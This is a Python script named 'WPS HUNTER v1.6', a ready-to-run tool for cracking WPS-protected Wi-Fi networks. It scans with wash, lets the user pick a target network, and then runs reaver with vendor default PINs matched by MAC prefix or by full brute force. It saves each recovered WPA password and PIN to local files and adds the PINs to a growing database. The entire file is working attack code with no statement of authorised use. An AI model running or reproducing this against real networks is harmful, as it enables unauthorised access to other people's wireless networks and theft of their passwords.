#!/usr/bin/env python3
import subprocess
import json
import os
from datetime import datetime
from rich.console import Console
from rich.table import Table

console = Console()

STATIC_DB = "static_db.json"
LEARNED_DB = "learned_db.json"
RESULT_FILE = "wps_s.json"

def show_banner():
    console.print("""
[bold red]
██╗    ██╗██████╗ ███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
██║    ██║██╔══██╗██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
██║ █╗ ██║██████╔╝███████╗    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
██║███╗██║██╔═══╝ ╚════██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██
╚███╔███╔╝██║     ███████║    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██   
 ╚══╝╚══╝ ╚═╝     ╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝ ╚═╝ 
[/bold red]
[bold cyan]WPS HUNTER v1.6 | Developed by WH04M1[/bold cyan]
""")

def load_db(path):
    if not os.path.exists(path):
        return {}
    with open(path) as f:
        return json.load(f)

def save_db(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=4)

def realtime_scan(interface):
    console.print(f"[yellow][+] Starting WPS scan on {interface} (Press Ctrl+C to stop)...[/yellow]")
    cmd = ["wash", "-i", interface, "-s", "--ignore-fcs"]

    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, bufsize=1)

    networks = []
    seen_bssids = set()

    try:
        for line in iter(process.stdout.readline, ''):
            line = line.strip()
            if not line or "BSSID" in line or "---" in line:
                continue

            print(line)  # اطبع مخرجات wash زي ما هي

            # فلترة للسطر
            if ":" in line:
                parts = line.split()
                if len(parts) >= 7:  # عشان نتاكد ان فيه كل الأعمدة
                    bssid = parts[0]
                    channel = parts[1]
                    rssi = parts[2]
                    ssid = " ".join(parts[6:])
                    if bssid not in seen_bssids:
                        seen_bssids.add(bssid)
                        networks.append({
                            "bssid": bssid,
                            "channel": channel,
                            "rssi": rssi,
                            "ssid": ssid
                        })
    except KeyboardInterrupt:
        console.print("\n[cyan][+] Scan stopped by user[/cyan]")
    finally:
        process.terminate()
        return networks

def save_success(target, manufacturer, pin, password):
    data = {
        "BSSID": target["bssid"],
        "SSID": target["ssid"],
        "Manufacturer": manufacturer,
        "WPS_PIN": pin,
        "Password": password,
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    old = []
    if os.path.exists(RESULT_FILE):
        old = load_db(RESULT_FILE)
    old.append(data)
    save_db(RESULT_FILE, old)
    console.print(f"[green][+] FILE SAVED {RESULT_FILE}[/green]")

def smart_attack(target, interface):
    static_db = load_db(STATIC_DB)
    learned_db = load_db(LEARNED_DB)

    manufacturer = "Unknown"
    oui_prefix = target["bssid"][:8].upper()
    pin_list = []

    for vendor, data in static_db.items():
        if any(oui.upper() in oui_prefix for oui in data["ouis"]):
            manufacturer = vendor
            pin_list.extend(data["pins"])
            break

    for entry in learned_db.get("entries", []):
        if entry.get("Manufacturer") == manufacturer:
            pin_list.append(entry["WPS_PIN"])

    pin_list = list(set(pin_list))

    console.print(f"[bold green][+] STARTED WPS ATTACK USING DB[/bold green]")
    console.print(f"[cyan][+] MAC DETECTED {target['bssid']} {manufacturer}[/cyan]")

    for i, pin in enumerate(pin_list, start=1):
        console.print(f"[yellow][+] TRY {i} ({pin})[/yellow]")
        cmd = ["reaver", "-i", interface, "-b", target["bssid"], "-p", pin, "-vv"]
        try:
            result = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=40).decode()
            if "WPA PSK" in result or "Key" in result:
                password = result.split("PSK:")[1].strip().replace("'", "")
                console.print(f"[bold green][+] SUCCEED !![/bold green]")
                console.print(f"[-KEY IS {password}]")
                save_success(target, manufacturer, pin, password)
                update_learned_db(learned_db, target, manufacturer, pin)
                return
        except subprocess.TimeoutExpired:
            console.print("[red][+] RECEIVED DEAUTH ![/red]")
        except Exception:
            console.print("[red][-] Error in attack process[/red]")

    console.print("[red][-] All PIN attempts failed[/red]")

def update_learned_db(learned_db, target, manufacturer, pin):
    if "entries" not in learned_db:
        learned_db["entries"] = []
    learned_db["entries"].append({
        "BSSID": target["bssid"],
        "Manufacturer": manufacturer,
        "WPS_PIN": pin,
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    save_db(LEARNED_DB, learned_db)

def brute_force(target, interface):
    console.print("[bold green][+] STARTED BRUTE FORCE ATTACK[/bold green]")
    cmd = ["reaver", "-i", interface, "-b", target["bssid"], "-vv"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    for line in process.stdout:
        if "Trying pin" in line:
            pin = line.split()[-1]
            console.print(f"[yellow][+] TRY PIN ({pin})[/yellow]")
        elif "WPA PSK" in line or "Key" in line:
            password = line.split("PSK:")[1].strip().replace("'", "")
            console.print(f"[bold green][+] SUCCEED !![/bold green]")
            console.print(f"[-KEY IS {password}]")
            save_success(target, "Unknown", "unknown", password)
            break

def main():
    show_banner()
    interface = input("[+] Enter your wireless interface (monitor mode): ")
    networks = realtime_scan(interface)
    if not networks:
        console.print("[red][-] No WPS-enabled networks detected![/red]")
        return

    console.print("\n[bold cyan]Networks detected:[/bold cyan]")
    table = Table(title="Detected WPS Networks")
    table.add_column("ID", style="cyan")
    table.add_column("BSSID", style="yellow")
    table.add_column("Channel", style="green")
    table.add_column("Signal", style="blue")
    table.add_column("SSID", style="magenta")
    for i, net in enumerate(networks):
        table.add_row(str(i + 1), net["bssid"], net["channel"], net["rssi"], net["ssid"])
    console.print(table)

    choice = int(input("[+] Select target ID: ")) - 1
    target = networks[choice]

    console.print("\n[bold cyan]Select Attack Mode:[/bold cyan]")
    console.print("[1] Smart DB Attack")
    console.print("[2] Brute Force Attack")
    mode = input("[+] Enter choice: ")

    if mode == "1":
        smart_attack(target, interface)
    elif mode == "2":
        brute_force(target, interface)
    else:
        console.print("[red][-] Invalid choice[/red]")

if __name__ == "__main__":
    main()
